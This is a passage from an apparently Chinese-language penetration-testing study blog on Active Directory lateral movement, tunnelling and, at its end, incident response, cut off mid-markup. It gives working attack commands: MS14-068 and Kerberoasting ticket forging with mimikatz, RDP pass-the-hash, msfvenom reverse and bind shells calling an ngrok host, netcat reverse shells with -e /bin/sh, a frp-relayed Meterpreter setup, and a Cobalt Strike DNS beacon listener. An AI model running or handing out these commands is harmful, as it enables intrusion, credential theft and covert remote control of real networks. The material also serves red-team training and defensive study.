<li>客户端向KDC（Key Distribution Center）请求获取想要访问的目标服务的服务授予票据（Ticket）</li>
<li>客户端拿着从KDC获取的服务授予票据（Ticket）访问相应的网络服务</li>
</ul>
<img src="/img/24.png" srcset="/img/loading.gif" lazyload style="zoom:50%;" />

<p><strong>MS14-068漏洞利用：powershell执行</strong></p>
<ol>
<li><p><code>whoami/user </code> &#x2F;&#x2F;查看当前sid</p>
</li>
<li><p><code>mimikatz # kerberos::purge</code>  &#x2F;&#x2F;清空当前机器中所有凭证,如果有域成员凭证会影响凭证伪造</p>
</li>
</ol>
<p>  <code>mimikatz # kerberos::list</code>  &#x2F;&#x2F;查看当前机器凭证</p>
<p>  <code>mimikatz # kerberos::ptc 票据文件</code> &#x2F;&#x2F;将票据注入到内存中</p>
<ol start="3">
<li>利用ms14-068生成TGT数据</li>
</ol>
<p>  <code>ms14-058.exe 域成员名@域名 -s sid -d 域控制器地址 -p 域成员密码</code></p>
<p>  <code>ms14-058.exe mary@god.org -s sid -d xx.xx.xx.xx -p password</code></p>
<ol start="4">
<li>票据注入内存</li>
</ol>
<p>  <code>mimikatz.exe &quot;kerberos::ptc TGT_mary@god.org.ccache&quot;</code></p>
<ol start="5">
<li><p>查看凭证列表  klist</p>
</li>
<li><p>利用 <code>dir \\xx.xx.xx.xx\C$</code></p>
</li>
</ol>
<p><strong>利用工具kekeo:</strong></p>
<ol>
<li>生成票据</li>
</ol>
<p>  <code>kekeo &quot;tgt::ask /user:mary /domain:god.org /ntlm:$HASH$&quot;</code></p>
<ol start="2">
<li>票据导入</li>
</ol>
<p>  <code>kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi</code></p>
<ol start="3">
<li><p>查看凭证 klist</p>
</li>
<li><p>利用 <code>dir \\xx.xx.xx.xx\C$</code></p>
</li>
</ol>
<p><strong>利用本地票据（需要管理权限） - 类比”伪造Cookie”</strong></p>
<ul>
<li><code>sekurlsa::tickets /export</code></li>
<li><code>kerberos::ptt xxxxxxxxxx.xxxx.kirbi</code></li>
</ul>
</li>
<li><p><strong>Ladon工具：<a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a></strong></p>
</li>
<li><p><strong>域横向移动RDP传递-Mimikatz</strong></p>
<p>除了上述讲到的IPC,WMI,SMB等协议的链接外,获取到的明文密码或HASH密文也可以通过RDP协议进行链接操作。</p>
<p>RDP协议连接:判断对方远程桌面是否开启(3389端口)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">RDP明文密码链接:<br>Windows : mstsc<br>	mstsc.exe /console /v xx.xx.xx.xx /admin<br>linux : rdesktop 192.168.3.21:3389<br><br>RDP密文Hash链接:<br>Windows Server需要开启Restricted Admin mode,在Windows 8.1和Windows Server 2012 R2中时默认开启的，同时如果Win7和Windows Server 2008 R2安装了2871997、2973351补丁也支持；<br>开启命令：<br>REG ADD <span class="hljs-string">&quot;HTML\SYSTEM\CurrentControlSet\Control\Lsa&quot;</span> /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f<br>开启后运行：<br>mstsc.exe /restrictedadmin<br>mimikatz.ese<br>privilege::debug<br>sekurlsa::pth /user:administrator /domain:god /ntlm:$HASH$ <span class="hljs-string">&quot;/run:mstsc.exe /restrictedadmin&quot;</span><br></code></pre></td></tr></table></figure>


</li>
<li><p><strong>域横向移动SPN  探针服务 — 请求票据 — 导出票据 — 破解票据 — 重写票据</strong></p>
<blockquote>
<p><strong>服务主体名称（SPN）</strong>是Kerberos客户端用于唯一标识给特定Kerberos目标计算机的服务实例名称。Kerberos身份验证使用SPN将服务实例与服务登录帐户相关联。如果在整个林中的计算机上安装多个服务实例，则每个实例都必须具有自己的SPN。如果客户端可能使用多个名称进行身份验证，则给定的服务实例可以具有多个SPN。例如，SPN总是包含运行服务实例的主机名称，所以服务实例可以为其主机的每个名称或别名注册一个SPN。</p>
<p><strong>spn扫描</strong>也可以叫扫描Kerberos服务实例名称，在Active Directory环境中发现服务的最佳方法是通过“SPN扫描”。通过请求特定SPN类型的服务主体名称来查找服务，SPN扫描攻击者通过网络端口扫描的主要好处是SPN扫描不需要连接到网络上的每个IP来检查服务端口。SPN扫描通过LDAP查询向域控制器执行服务发现。由于SPN查询是普通Kerberos票据的一部分，因此如果不能被查询，但可以用网络端口扫描来确认。</p>
<p>黑客可以使用有效的域用户的身份验证票证（TGT）去请求运行在服务器上的一个或多个目标服务的服务票证。</p>
<p>DC在活动目录中查找SPN，并使用与SPN关联的服务帐户加密票证，以便服务能够验证用户是否可以访问。</p>
<p>请求的Kerberos服务票证的加密类型是RC4_HMAC_MD5，这意味着服务帐户的NTLM密码哈希用于加密服务票证。</p>
<p>黑客将收到的TGS票据离线进行破解，即可得到目标服务帐号的HASH，这个称之为Kerberoast攻击。</p>
<p>如果我们有一个为域用户帐户注册的任意SPN，那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证。</p>
</blockquote>
<p><strong>探针服务</strong></p>
<ul>
<li><code>setspn -q **/**</code></li>
<li><code>*setspn -q \*/** | finder &quot;MSSQL&quot;</code>  &#x2F;&#x2F;寻找特定的服务</li>
</ul>
<p><strong>请求票据</strong></p>
<ul>
<li><code>Add-Type -AssemblyName System.IdentityModel</code></li>
<li><code>New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;xxxx&quot;</code></li>
<li><code>mimikatz.exe &quot;kerberos::ask /target:xxxx&quot;</code></li>
</ul>
<p><strong>导出票据：</strong></p>
<ul>
<li><code>mimikatz.exe &quot;kerberos::list /export&quot;</code></li>
</ul>
<p><strong>破解票据：</strong></p>
<ul>
<li><code>python tgsrepcrack.py pass.txt &quot;xxxx.kirbi&quot;</code></li>
</ul>
<p><strong>重写票据：</strong></p>
<ul>
<li><code>python kerberoast.py -p Password -r xxxx.kirbi -w xxxx.kirbi -u 500 </code></li>
<li><code>python kerberoast.py -p Password -r xxxx.kirbi -w xxxx.kirbi -g 512 </code></li>
<li><code>mimikatz.exe kerberos::ptt xxxx.kirbi</code> &#x2F;&#x2F;将生成的票据导入内存</li>
</ul>
</li>
<li><p><strong>CobaltStrike</strong></p>
<p><strong>启动 — 配置 — 监听 — 执行 — 上线 — 提权 — 信息收集(网络,凭证,定位等) — 渗透</strong></p>
<ol>
<li>客户端连接CS服务器</li>
<li>配置监听器 — 监听器就是配置一个木⻢传输的管道</li>
<li>生成后⻔ — Windows &#x2F; Linux</li>
<li>上传到目标服务器</li>
<li>当上传后⻔执行后,cs客户端便会上线目标服务器</li>
<li>接下来可以进行提权操作（通过上传插件增加提权的方式）</li>
<li>在对目标主机进行信息收集等操作，探针是否存在内网再对内网进行渗透</li>
</ol>
</li>
<li><p><strong>域横向内网穿透Socks代理技术</strong></p>
<p><strong>解决问题：</strong></p>
<p>代理主要解决网络连通性问题</p>
<p><strong>方向：</strong></p>
<p>正向 : 指正方向连接,控制端连接被控制端</p>
<p>反向 : 指反方向连接,被控制端连接控制端</p>
<p><strong>工具：</strong></p>
<p>nps , frp , ngrok , reGerog , sockscap64 , earthworm , proxifier , proxychains</p>
<p>当攻击者在内网中的计算机无法直接寻找到被攻击者在内网中的计算机时，通过使用Socks代理隧道技术在外网购买或者搭建一个中专服务器，达到以这个服务器为中转站从而可以使在内网中的攻击者的计算机可以寻找到在内网中存在的被攻击者计算机。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs awk">Ngrok — 购买的外网服务器从而达到两个不同内网之间的穿透（http:<span class="hljs-regexp">//</span>www.ngrok.cc）<br>首先在Ngrok官网配置本地端口：<span class="hljs-number">192.168</span>.<span class="hljs-number">77.606</span>:<span class="hljs-number">4444</span><br>通过使用msf生成后门脚本并穿透：<br>msfvenom -p windows<span class="hljs-regexp">/meterpreter/</span>reverse_http lhost=shallow.free.idcfengye.com lport=<span class="hljs-number">80</span> -f exe -o test.exe<br>use exploit<span class="hljs-regexp">/multi/</span>handler<br>set payload windows<span class="hljs-regexp">/meterpreter/</span>reverse_http<br>set lhost <span class="hljs-number">192.168</span>.<span class="hljs-number">77.606</span><br>set lport <span class="hljs-number">4444</span><br>exploit<br><br>Frp — 自建服务器作为中转从而达到两个内网通讯上线<br><span class="hljs-number">1</span>.服务端-下载-解压-修改-启动(阿里云主机需要修改安全组配置出入口)<br>	服务器修改配置文件frps.ini:<br>	[common]<br>	bind_port = <span class="hljs-number">8899</span><br>	启动服务端: .<span class="hljs-regexp">/frps -c ./</span>frps.ini<br><br><span class="hljs-number">2</span>.控制端-下载-解压-修改-启动<br>	控制端修改配置文件<br>  [common]<br>  server_addr=你的云主机ip(服务端的ip/公网ip)<br>  server_port=<span class="hljs-number">8899</span> <span class="hljs-comment">#frpc工作端口,必须和上面保持一致</span><br>  [msf]<br>  type = tcp<br>  local_ip = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>  local_port=<span class="hljs-number">5555</span><br>  <span class="hljs-comment">#转发给本机的5555</span><br>  remote_port=<span class="hljs-number">6000</span><br>  <span class="hljs-comment">#服务端用6000端口转发给本机</span><br>  启动客户端 .<span class="hljs-regexp">/frpc -c ./</span>frpc.ini<br><br><span class="hljs-number">3</span>.生成木马<br>	msfvenom -p windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp lhost=公网ip lport=<span class="hljs-number">6000</span> -f exe -o frptest.exe<br>	use exploit<span class="hljs-regexp">/multi/</span>handler<br>	set payload windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp<br>	set lhost <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>	set lport <span class="hljs-number">5555</span><br>	exploit<br><br>某CTF真题 — 内网中存在三台主机，攻击者只能访问到A主机<br>		（在A主机中存在两张网卡 只能通过A主机访问B主机 同时在B中存在两张网卡 只能通过B主机访问C主机）<br><span class="hljs-number">1</span>.通过对A主机端口扫描,得知开启了<span class="hljs-number">80</span>端口,访问此端口利用Web漏洞对其攻击，其中是ThinkPHP框架<br>	得到一个命令执行漏洞,写入webshell在目标主机中<br><br><span class="hljs-number">2</span>.通过后⻔管理工具进行连接<br>	蚁剑 or 冰蝎<br><br><span class="hljs-number">3</span>.接下来将A作为一个跳板,使用msf或者CS<br>	msfvenom -p linux<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp LHOST=<span class="hljs-number">192.168</span>.<span class="hljs-number">76</span>.x LPORT=<span class="hljs-number">1111</span> -f elf &gt;t1.elf<br>	use exploit<span class="hljs-regexp">/multi/</span>handler<br>	set payload linux<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp<br>	set LHOST <span class="hljs-number">192.168</span>.<span class="hljs-number">76</span>.x<br>	set LPORT <span class="hljs-number">1111</span><br>	exploit<br><br><span class="hljs-number">4</span>.当获取A主机的会话窗口对其进行信息收集<br>	获取网络接口：run get_local_subnets<br>	查看路由地址：run autoroute -p<br>	添加路由地址：run autoroute -s <span class="hljs-number">192.168</span>.<span class="hljs-number">22.0</span>/<span class="hljs-number">24</span><br><br><span class="hljs-number">5</span>.当添加完路由地址之后还无法直接对内网中的B主机进行访问，设置路由<br>	开启本地代理：（创建SOCK5协议代理）<br>	use auxiliary<span class="hljs-regexp">/server/</span>socks5<br>	set srvport <span class="hljs-number">2222</span><br>	exploit<br><br><span class="hljs-number">6</span>.接下来通过代理对B主机进行访问<br>	配置proxychains后调用工具探针Target2<br>	或者利用代理工具Proxifier或SocksCap64<br><br><span class="hljs-number">7</span>.当可以连接到B主机之后：探针目标-利用WEB漏洞(SQL注入)-后台获取webshell权限<br>	http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">22</span>.x/index.php?r=vul&amp;keyword=<span class="hljs-number">1</span> <span class="hljs-comment">#sql注入</span><br>	http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">22</span>.x<span class="hljs-regexp">/index.php?r=admini/</span>public/login <span class="hljs-comment">#后台</span><br>	http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">22</span>.x/index.php?r=special <span class="hljs-comment">#后门shell</span><br><br><span class="hljs-number">8</span>.在这种情况下无法生成反向后门（无法让B主机找到我们的主机） 所以要生成正向木马由本机去寻找B主机<br>	正向后门 msfvenom -p linux<span class="hljs-regexp">/x64/m</span>eterpreter/bind_tcp LPORT=<span class="hljs-number">3333</span> -f elf &gt; t2.elf<br>	use exploit<span class="hljs-regexp">/multi/</span>handler<br>	set payload linux<span class="hljs-regexp">/x64/m</span>eterpreter/bind_tcp<br>	set rhost <span class="hljs-number">192.168</span>.<span class="hljs-number">22</span>.x<br>	set LPORT <span class="hljs-number">3333</span><br>	exploit<br><br><span class="hljs-number">9</span>.接下来对B主机进行信息收集<br>	同 <span class="hljs-number">4</span><br><br><span class="hljs-number">10</span>.设置路由<br><br><span class="hljs-number">11</span>.同时对C主机生成正向后门<br></code></pre></td></tr></table></figure>


</li>
<li><p><strong>域横向穿透网络 &amp; 传输 &amp; 应用层隧道技术</strong></p>
<blockquote>
<p>隧道主要是解决流量分析工具,流量监控工具,防火墙相关过滤</p>
<p>隧道技术前期的必备条件：已经获得一定的控制权,但是不能对控制的东⻄进行信息收集或执行它上面的东⻄在数据通信被拦截的情况下利用隧道技术封装改变通信协议进行绕过拦截.</p>
<p>存在的问题 ：CS、MSF无法上线,数据传输不稳定无回显,出口数据被监控,网络通信存在问题等。</p>
<p>在实际的网络中，通常会通过各种边界设备、软&#x2F;硬件防火墙甚至入侵检测系统来检查对外连接情况，如果发现异样，就会对通信进行阻断。在这种情况下隧道是一种绕过端口屏蔽的通信方式。防火墙两端的数据包以通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方进行通信。当封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应服务器上。</p>
</blockquote>
<p><strong>常用的隧道技术有以下三种:</strong></p>
<ul>
<li>网络层:IPV6隧道、ICMP隧道</li>
<li>传输层:TCP、UDP、端口转发</li>
<li>应用层:SSH、HTTP&#x2F;S隧道、DNS隧道</li>
</ul>
<p><strong>工具：</strong></p>
<p>lcx , netcat , dns2tcp , pingtunnel</p>
<p><strong>可用隧道检测：</strong></p>
<p><strong>网络传输应用层检测连接通信-检测</strong></p>
<p>1.TCP协议</p>
<p>  用瑞士军刀-netcat</p>
<p>  执行nc命令:nc &lt;IP&gt; &lt;端口&gt;</p>
<p>2.HTTP协议</p>
<p>  用“curl”工具,执行curl&lt;IP地址:端口&gt;命令。如果远程主机开启了相应的端口,且内网可连接外网的话,就会输出相应的端口信息</p>
<p>3.ICMP协议</p>
<p>  用”ping”命令,执行ping &lt;IP地址&#x2F;域名&gt;</p>
<p>4.DNS协议</p>
<p>  检测DNS连通性常用的命令是”nslookup”和”dig”</p>
<p>  nslookup是Windows自带的DNS探测命令</p>
<p>  dig是Linux系统自带的DNS探测命令</p>
<p><strong>网络层ICMP隧道pingtunnel使用-检测,利用</strong></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">pingtunnel是吧tcp<span class="hljs-regexp">/udp/</span>sock5流量伪装成Icmp流量进行转发的工具 https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/esrrhs/</span>pingtunnel<br>-p <span class="hljs-regexp">//</span>表示连接icmp随到另一端的机器IP（目标服务器）<br>-lp <span class="hljs-regexp">//</span>表示需要监听的本地Tcp端口<br>-da <span class="hljs-regexp">//</span>指定需要转发的机器IP（内网机器的内网IP）<br>-dp <span class="hljs-regexp">//</span>指定需要转发的机器的端口（内网机器的端口）<br>-x <span class="hljs-regexp">//</span>设置链接密码<br><br>ptunnel - 老工具<br><br>Webserver: ptunnel -x password<br>Hack: ptunnel -p Webserver(ip) -lp <span class="hljs-number">5566</span> -da 内网(ip) -dp <span class="hljs-number">3389</span> -x password<br>			rdesktop <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">5566</span><br></code></pre></td></tr></table></figure>



<p><strong>传输层转发隧道Portmap使用-检测,利用</strong></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">端口转发,环境是域环境<br>Windows:lcx<br>Linux:portmp<br>lcx -slave 攻击IP:<span class="hljs-number">6677</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">3389</span> <span class="hljs-regexp">//</span>将本地<span class="hljs-number">3389</span>给攻击IP的<span class="hljs-number">6677</span>端口<br>lcx -listen <span class="hljs-number">6677</span> <span class="hljs-number">3333</span> <span class="hljs-regexp">//</span>监听<span class="hljs-number">6677</span>端口转发至<span class="hljs-number">3333</span><br><br>rdesktop 攻击(ip):<span class="hljs-number">3333</span> <span class="hljs-regexp">//</span>通过<span class="hljs-number">3333</span>端口首先连接到<span class="hljs-number">6677</span>端口 再从<span class="hljs-number">6677</span>端口到内网中ip的<span class="hljs-number">3389</span>端口<br></code></pre></td></tr></table></figure>



<p><strong>传输层转发隧道Netcat使用-检测,利用,功能</strong></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>.双向连接反弹shell<br>	正向:攻击连接受害<br>	受害 : nc -ldp <span class="hljs-number">1234</span> -e <span class="hljs-regexp">/bin/</span>sh   <span class="hljs-regexp">//</span>linux<br>				 nc -ldp <span class="hljs-number">1234</span> -e c:\windows\system32\cmd.exe  <span class="hljs-regexp">//</span>windows<br>	攻击 : nc 受害主机IP <span class="hljs-number">1234</span> <span class="hljs-regexp">//</span>主动连接<br>	反向:受害连接攻击<br>	攻击 : nc -lvp <span class="hljs-number">1234</span> <span class="hljs-regexp">//</span>监听本机<span class="hljs-number">1234</span>端口<br>	受害 : nc 攻击主机IP <span class="hljs-number">1234</span> -e <span class="hljs-regexp">/bin/</span>sh   <span class="hljs-regexp">//</span>linux<br>         nc 攻击主机IP <span class="hljs-number">1234</span> -e c:\windows\system32\cmd.exe  <span class="hljs-regexp">//</span>windows<br><br><span class="hljs-number">2</span>.多向连接反弹shell-配合转发<br>	受害 : nc 中转主机IP <span class="hljs-number">1234</span> -e <span class="hljs-regexp">/bin/</span>sh   <span class="hljs-regexp">//</span>linux<br>	       nc 中转主机IP <span class="hljs-number">1234</span> -e c:\windows\system32\cmd.exe  <span class="hljs-regexp">//</span>windows<br>	中转 : lcx -listen <span class="hljs-number">1234</span> <span class="hljs-number">3333</span> <span class="hljs-regexp">//</span>监听<span class="hljs-number">1234</span>端口转发至<span class="hljs-number">3333</span><br>	攻击 : nc 中转主机IP <span class="hljs-number">3333</span><br><br><span class="hljs-number">3</span>.相关netcat主要功能测试<br>	指纹服务:nc -nv <span class="hljs-number">192.168</span>.<span class="hljs-number">76.143</span><br>	端口服务:nc -v -z <span class="hljs-number">192.168</span>.<span class="hljs-number">76.143</span> <span class="hljs-number">1</span>-<span class="hljs-number">100</span><br>	端口监听:nc -lvp xxxx<br>	文件传输:nc -lp <span class="hljs-number">1111</span> &gt;<span class="hljs-number">1</span>.txt | nc -vn xx.xx.xx.xx <span class="hljs-number">1111</span> &lt;<span class="hljs-number">1</span>.txt -q <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>



<p><strong>应用层DNS隧道配合CS上线-检测,利用,说明</strong></p>
<p>当常⻅协议监听器被拦截时,可以换其他协议上线 — dns协议</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-number">1</span>.<span class="hljs-keyword">cs</span>所在的服务器配置端口<span class="hljs-number">53</span>启用-udp<br><span class="hljs-number">2</span>.买一个域名修改解析记录如下:<br>	A记录-<span class="hljs-keyword">cs</span>主机名-<span class="hljs-keyword">cs</span>服务器ip<br>	NS记录-ns1主机名-上个A记录地址<br>	NS记录-ns2主机名-上个A记录地址<br><span class="hljs-number">3</span>.配置DNS监听器内容如下:<br>	DNS Hosts:<br>	ns1.test.<span class="hljs-keyword">com</span><br>  ns2.test.<span class="hljs-keyword">com</span><br>  DNS Host(Stage)<br>  <span class="hljs-keyword">cs</span>.test.<span class="hljs-keyword">com</span><br><span class="hljs-number">4</span>.生成后⻔执行上线后启用命令:<br>	beacon &gt; checkin<br>	beacon &gt; <span class="hljs-keyword">mode</span> DNS-TXT<br>	beacon &gt; <span class="hljs-keyword">shell</span> whoam<br></code></pre></td></tr></table></figure></li>
</ul>
<h3 id="CS-amp-MSF-联动"><a href="#CS-amp-MSF-联动" class="headerlink" title="CS&amp;MSF 联动"></a><strong>CS&amp;MSF 联动</strong></h3><p><strong>CS -&gt; MSF</strong></p>
<ol>
<li><p>CS创建Foreign监听器</p>
</li>
<li><p>MSF监听模块设置对应的地址端口</p>
<p>在msf上创建监听器,payload要和cs监听器协议一样,端口也要一样</p>
</li>
<li><p>CS执行Spawn选择监听器</p>
<p>想要反弹哪个会话,点击视图中对应的电脑,选择 Spawn</p>
</li>
</ol>
<p><strong>MSF -&gt; CS</strong></p>
<ol>
<li><p>CS创建监听器</p>
</li>
<li><p>MSF载入新模块注入设置对应地址端口</p>
<p><code>use exploit/windows/local/payload_inject</code></p>
</li>
<li><p>执行CS上线</p>
</li>
</ol>
<h1 id="九、应急响应"><a href="#九、应急响应" class="headerlink" title="九、应急响应"></a>九、应急响应</h1><blockquote>
<p>1、熟悉常用的web安全攻击技术</p>
<p>2、熟悉相关日志启用以及存储查看等</p>
<p>3、熟悉日志中记录数据分类和分析等</p>
<p>4、自动化响应检测工具Gscan</p>
</blockquote>
<h3 id="应急响应过程"><a href="#应急响应过程" class="headerlink" title="应急响应过程"></a>应急响应过程</h3><p>目的：分析攻击时间、攻击操作、攻击结果、安全修复等并给出合理的解决方案</p>
<p>保护阶段：直接断网，保护现场，看是否能够恢复数据</p>
<p>分析阶段：对入侵过程进行分析，常见方法为指纹库搜索、日志时间分析、后门追查分析、漏洞检查分析等</p>
<p>复现阶段：还原攻击过程，模拟攻击者入侵思路，关注攻击者在系统中应用的漏洞、手法</p>
<p>修复阶段：分析原因后，修补相关系统、应用漏洞，如果存在后门或弱口令，及时清除并整改</p>
<p>建议阶段：对攻击者利用的漏洞进行修补，加强系统安全同时提高安全意识</p>
<h3 id="前期准备工作"><a href="#前期准备工作" class="headerlink" title="前期准备工作"></a>前期准备工作</h3><p>1、收集目标服务器信息</p>
<p>2、部署相关分析软件和平台等</p>
<p>3、整理相关安全渗透测试工具指纹库</p>
<p>4、针对异常表现第一时间触发思路</p>
<p>从受害方提供的信息预估入侵面以及权限面进行排查，分为有明确信息和无明确信息两种情况：</p>
<p>1、如果有明确信息的情况下，基本上会提出关于时间、操作以及指纹这一类的相关信息</p>
<ul>
<li>基于时间：如果受害方提供了文件被修改日期、异常登录日期，那么我们就可以锁定这一时期的相关日志进行查看，不必去大海捞针一天天地看日志了。从而有针对性地对目标攻击事件进行分析。</li>
<li>基于操作：如果受害方提供了被删除、被加密的数据、文件位置，如数据库、磁盘等，那么我们可以根据攻击者的操作判断它入侵了哪些地方并可能分析出攻击过程。</li>
<li>基于指纹：如果受害方只说是网页被修改、网站被上马，那么我们可以根据攻击工具的指纹、木马的指纹、病毒的指纹、修改的内容等判断攻击者使用了何种工具、处于何种技术水平。</li>
</ul>
<p>2、如果无明确信息的情况下，那么就需要排查全部可能入侵的手法：</p>
<ul>
<li>web漏洞：检查源码类别和漏洞情况</li>
<li>中间件漏洞：检查对应版本和漏洞情况</li>
<li>第三方应用漏洞：检查是否存在漏洞应用</li>
<li>操作系统漏洞：检查是否存在系统漏洞</li>
<li>其他安全问题：检查相关用户口令以及后门扫描</li>
</ul>
<h3 id="操作系统分析（病毒、后门）-应急响应"><a href="#操作系统分析（病毒、后门）-应急响应" class="headerlink" title="操作系统分析（病毒、后门）- 应急响应"></a>操作系统分析（病毒、后门）- 应急响应</h3><p><strong>危害：</strong></p>
<ul>
<li>暴力破解：针对系统有包括rdp、ssh、telnet等，针对服务有包括mysql、ftp等，一般可以通过超级弱口令工具、hydra进行爆破</li>
<li>漏洞利用：通过系统、服务的漏洞进行攻击，如永恒之蓝等</li>
<li>流量攻击：主要是对目标机器进行dos攻击，从而导致服务器瘫痪</li>
<li>木马控制：主要分为webshell和PC木马，webshell是存在于网站应用中的，而PC木马是进入系统进行植入的。目的是对系统进行持久控制</li>
<li>病毒感染：主要分挖矿病毒、蠕虫病毒、勒索病毒等，对目标文件或目录进行加密，用户需要支付酬金给黑客</li>
</ul>
<p><strong>分析：</strong></p>
<ul>
<li>账户：账户异常、账户增加，看攻击者是否留有后门账户</li>
<li>端口：异常端口开放，看是否与外部地址的某个端口建立了连接</li>
<li>进程：异常进程加载，看是否存在异常进程执行（排除系统正常进程）</li>
<li>网络：网络连接异常，看是否对局域网内其他IP地址进行请求（横向）或自身网络异常</li>
<li>启动：异常程序开机自启动，看是否存在开机自启动的程序，排查是否为恶意程序</li>
<li>服务：异常服务添加、启动，看机器上是否存在异常服务（排除系统正常服务）</li>
<li>任务：异常定时任务执行，看机器上是否存在定时任务</li>
<li>文件：异常文件，看机器上是否存在异常文件，如后门、病毒、木马等</li>
</ul>
<p><strong>系统日志：</strong></p>
<ul>
<li>windows：事件查看器 — windows日志（包括应用程序、安全、Setup、系统、事件）</li>
<li>Linux : cd &#x2F;var&#x2F;log</li>
</ul>
<p>通过网络监听工具及 windows 日志分析或执行记录查找后门问题</p>
<h3 id="查看RDP、SSH"><a href="#查看RDP、SSH" class="headerlink" title="查看RDP、SSH"></a>查看RDP、SSH</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stata">对RDP工具的查看；<br>在<span 